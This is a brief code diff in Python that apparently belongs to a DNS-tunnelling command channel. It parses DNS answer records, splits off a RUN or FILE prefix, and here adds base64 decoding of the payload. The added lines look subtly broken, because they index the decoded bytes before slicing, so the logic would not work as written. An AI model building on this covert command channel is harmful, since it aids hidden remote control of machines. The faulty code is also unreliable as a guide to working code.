@@ -33,8 +33,10 @@ def parse_packet(packet):
        
         global cond
         cond = 1
-        prefix_packet = packet[1][DNSRR].rdata[0][:6]
-        data_recieved = packet[1][DNSRR].rdata[0][6:]
+        base64_rdata = packet[1][DNSRR].rdata[0]
+        rdata = base64.b64decode(base64_rdata)
+        prefix_packet = rdata[0][:6]
+        data_recieved = rdata[0][6:]
         if prefix_packet == RUN or prefix_packet == FILE:
             txt_recieved = bin_to_str(data_recieved)
             if prefix_packet == RUN:
